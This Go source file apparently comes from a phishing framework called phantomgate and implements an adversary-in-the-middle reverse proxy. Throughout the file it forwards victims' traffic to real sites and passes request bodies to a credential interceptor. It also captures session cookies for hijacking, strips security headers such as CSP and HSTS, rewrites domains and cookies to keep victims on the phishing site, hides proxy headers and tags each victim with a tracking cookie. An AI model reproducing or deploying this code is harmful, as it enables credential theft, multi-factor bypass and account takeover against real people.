package proxy

import (
	"compress/gzip"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/phantomgate/phantomgate/internal/capture"
	"github.com/phantomgate/phantomgate/internal/config"
	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

// PhantomProxy is the core transparent reverse proxy engine
type PhantomProxy struct {
	config     *config.Config
	phishlet   *phishlet.Phishlet
	store      *store.Store
	credSniff  *capture.CredentialInterceptor
	sessSniff  *capture.SessionHijacker
	phishDomain string
	hostMap    map[string]string // phish_host → real_host
	hostSSL    map[string]bool   // phish_host → is_ssl
}

// NewPhantomProxy creates a new AiTM reverse proxy
func NewPhantomProxy(cfg *config.Config, p *phishlet.Phishlet, s *store.Store) *PhantomProxy {
	hostSSL := make(map[string]bool)
	for _, h := range p.ProxyHosts {
		phishHost := h.PhishSub + "." + cfg.Domain
		hostSSL[phishHost] = h.IsSSL
	}
	pp := &PhantomProxy{
		config:      cfg,
		phishlet:    p,
		store:       s,
		credSniff:   capture.NewCredentialInterceptor(s, p),
		sessSniff:   capture.NewSessionHijacker(s, p),
		phishDomain: cfg.Domain,
		hostMap:     p.GetHostMappings(cfg.Domain),
		hostSSL:     hostSSL,
	}
	return pp
}

// ServeHTTP handles every incoming request through the MITM proxy
func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	// Determine the real target host from the phishing host
	realHost, ok := pp.hostMap[req.Host]
	if !ok {
		// Try without port
		hostNoPort := strings.Split(req.Host, ":")[0]
		realHost, ok = pp.hostMap[hostNoPort]
		if !ok {
			http.Error(w, "Not Found", 404)
			return
		}
	}

	// Extract or assign victim ID via tracking cookie
	victimID := pp.getOrSetVictimID(w, req)

	// Read the request body for credential inspection
	var bodyBytes []byte
	if req.Body != nil {
		var err error
		bodyBytes, err = capture.ReadBody(req)
		if err != nil {
			log.Printf("[!] Failed to read request body: %v", err)
		}
	}

	// Inspect the request for credentials (non-blocking)
	if len(bodyBytes) > 0 {
		go pp.credSniff.InspectRequest(req, bodyBytes, victimID)
	}

	// Build the target URL — detect scheme from phishlet config
	scheme := "https"
	hostKey := strings.Split(req.Host, ":")[0]
	if isSSL, ok := pp.hostSSL[req.Host]; ok && !isSSL {
		scheme = "http"
	} else if isSSL, ok := pp.hostSSL[hostKey]; ok && !isSSL {
		scheme = "http"
	}
	targetURL, _ := url.Parse(fmt.Sprintf("%s://%s", scheme, realHost))

	// Create the reverse proxy
	proxy := httputil.NewSingleHostReverseProxy(targetURL)

	// Custom transport: skip TLS verification (we're proxying to the real site)
	proxy.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// Modify the request before forwarding
	originalDirector := proxy.Director
	proxy.Director = func(proxyReq *http.Request) {
		originalDirector(proxyReq)

		// Set the real host header
		proxyReq.Host = realHost
		proxyReq.URL.Host = realHost
		proxyReq.URL.Scheme = scheme

		// Remove proxy-revealing headers
		if pp.config.Stealth.RemoveProxyHeaders {
			proxyReq.Header.Del("X-Forwarded-For")
			proxyReq.Header.Del("X-Forwarded-Proto")
			proxyReq.Header.Del("X-Real-IP")
			proxyReq.Header.Del("Via")
		}

		// Rewrite Referer and Origin headers to point to the real target
		if referer := proxyReq.Header.Get("Referer"); referer != "" {
			proxyReq.Header.Set("Referer", pp.rewriteURLToReal(referer))
		}
		if origin := proxyReq.Header.Get("Origin"); origin != "" {
			proxyReq.Header.Set("Origin", pp.rewriteURLToReal(origin))
		}

		log.Printf("[→] %s %s %s (Victim: %s → Target: %s)",
			req.RemoteAddr, req.Method, req.URL.Path, victimID[:8], realHost)
	}

	// Modify the response after receiving it from the real target
	proxy.ModifyResponse = func(resp *http.Response) error {
		// Capture session cookies
		pp.sessSniff.InspectResponse(resp, victimID)

		// Rewrite response body (URLs, domains) to point back to our phishing domain
		pp.rewriteResponse(resp)

		// Rewrite Set-Cookie domains
		pp.rewriteCookieDomains(resp)

		// Rewrite Location header for redirects
		if location := resp.Header.Get("Location"); location != "" {
			resp.Header.Set("Location", pp.rewriteURLToPhish(location))
		}

		// Remove security headers that might break the proxy
		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("Content-Security-Policy-Report-Only")
		resp.Header.Del("Strict-Transport-Security")
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("X-Content-Type-Options")
		resp.Header.Del("X-XSS-Protection")

		// Spoof server header
		if pp.config.Stealth.SpoofServerHeader != "" {
			resp.Header.Set("Server", pp.config.Stealth.SpoofServerHeader)
		}

		return nil
	}

	// Handle proxy errors gracefully
	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		log.Printf("[!] Proxy error: %v (target: %s%s)", err, realHost, r.URL.Path)
		http.Error(w, "Service Unavailable", http.StatusBadGateway)
	}

	proxy.ServeHTTP(w, req)
}

// rewriteResponse modifies the response body to replace real domain references
// with our phishing domain references
func (pp *PhantomProxy) rewriteResponse(resp *http.Response) {
	contentType := resp.Header.Get("Content-Type")

	// Only rewrite text-based responses
	rewritable := false
	for _, mime := range []string{"text/html", "text/css", "application/javascript", "application/json", "text/javascript", "application/xml"} {
		if strings.Contains(contentType, mime) {
			rewritable = true
			break
		}
	}
	if !rewritable {
		return
	}

	// Read the response body
	var reader io.ReadCloser
	var err error

	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return
		}
		defer reader.Close()
		resp.Header.Del("Content-Encoding")
	default:
		reader = resp.Body
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		return
	}
	resp.Body.Close()

	bodyStr := string(body)

	// Apply phishlet sub_filters
	for _, filter := range pp.phishlet.SubFilters {
		// Check MIME type filter
		if len(filter.MimeTypes) > 0 {
			matched := false
			for _, mime := range filter.MimeTypes {
				if strings.Contains(contentType, mime) {
					matched = true
					break
				}
			}
			if !matched {
				continue
			}
		}

		search := filter.Search
		replace := strings.ReplaceAll(filter.Replace, "{phish_domain}", pp.phishDomain)
		bodyStr = strings.ReplaceAll(bodyStr, search, replace)
	}

	// Generic domain rewriting: replace all real host references with phish hosts
	for phishHost, realHost := range pp.hostMap {
		bodyStr = strings.ReplaceAll(bodyStr, realHost, phishHost)
	}

	// Update response body
	resp.Body = io.NopCloser(strings.NewReader(bodyStr))
	resp.ContentLength = int64(len(bodyStr))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyStr)))
}

// rewriteCookieDomains changes Set-Cookie domain attributes to our phishing domain
func (pp *PhantomProxy) rewriteCookieDomains(resp *http.Response) {
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}

	// Clear existing Set-Cookie headers
	resp.Header.Del("Set-Cookie")

	for _, cookie := range cookies {
		// Rewrite the domain to our phishing domain
		if cookie.Domain != "" {
			cookie.Domain = pp.phishDomain
		}
		// Remove Secure flag if we're testing without HTTPS
		// cookie.Secure = false

		// Remove SameSite restrictions
		cookie.SameSite = http.SameSiteLaxMode

		resp.Header.Add("Set-Cookie", cookie.String())
	}
}

// rewriteURLToPhish converts a real target URL to a phishing URL
func (pp *PhantomProxy) rewriteURLToPhish(rawURL string) string {
	for phishHost, realHost := range pp.hostMap {
		rawURL = strings.ReplaceAll(rawURL, realHost, phishHost)
	}
	return rawURL
}

// rewriteURLToReal converts a phishing URL back to the real target URL
func (pp *PhantomProxy) rewriteURLToReal(rawURL string) string {
	for phishHost, realHost := range pp.hostMap {
		rawURL = strings.ReplaceAll(rawURL, phishHost, realHost)
	}
	return rawURL
}

// getOrSetVictimID extracts or generates a unique victim tracking ID
func (pp *PhantomProxy) getOrSetVictimID(w http.ResponseWriter, req *http.Request) string {
	// Check for existing tracking cookie
	if cookie, err := req.Cookie("_pg_vid"); err == nil && cookie.Value != "" {
		return cookie.Value
	}

	// Check for lure parameter
	if lureID := req.URL.Query().Get("_lid"); lureID != "" {
		pp.setTrackingCookie(w, lureID)
		return lureID
	}

	// Generate new victim ID
	b := make([]byte, 16)
	rand.Read(b)
	victimID := hex.EncodeToString(b)
	pp.setTrackingCookie(w, victimID)
	return victimID
}

func (pp *PhantomProxy) setTrackingCookie(w http.ResponseWriter, victimID string) {
	http.SetCookie(w, &http.Cookie{
		Name:     "_pg_vid",
		Value:    victimID,
		Path:     "/",
		HttpOnly: true,
		MaxAge:   86400 * 7, // 7 days
	})
}

// GetListenAddr returns the address the proxy should listen on
func (pp *PhantomProxy) GetListenAddr() string {
	return fmt.Sprintf("%s:%d", pp.config.ListenIP, pp.config.HTTPSPort)
}

// GetHTTPAddr returns the HTTP redirect listener address
func (pp *PhantomProxy) GetHTTPAddr() string {
	return fmt.Sprintf("%s:%d", pp.config.ListenIP, pp.config.HTTPPort)
}

// CreateTLSConfig generates a TLS configuration for the proxy listener
func (pp *PhantomProxy) CreateTLSConfig() (*tls.Config, error) {
	switch pp.config.TLS.Mode {
	case "manual":
		cert, err := tls.LoadX509KeyPair(pp.config.TLS.CertFile, pp.config.TLS.KeyFile)
		if err != nil {
			return nil, fmt.Errorf("failed to load TLS certificate: %w", err)
		}
		return &tls.Config{
			Certificates: []tls.Certificate{cert},
		}, nil
	case "self-signed":
		return pp.generateSelfSignedTLS()
	default:
		return pp.generateSelfSignedTLS()
	}
}

// generateSelfSignedTLS creates a self-signed certificate for testing
func (pp *PhantomProxy) generateSelfSignedTLS() (*tls.Config, error) {
	// For development: use a self-signed cert
	// In production, you'd use Let's Encrypt
	cert, err := generateSelfSignedCert(pp.phishDomain)
	if err != nil {
		return nil, err
	}
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
	}, nil
}

// generateSelfSignedCert creates a basic self-signed certificate
func generateSelfSignedCert(domain string) (tls.Certificate, error) {
	privKey, err := generatePrivateKey()
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM, keyPEM, err := createSelfSignedCertPEM(privKey, domain)
	if err != nil {
		return tls.Certificate{}, err
	}

	return tls.X509KeyPair(certPEM, keyPEM)
}
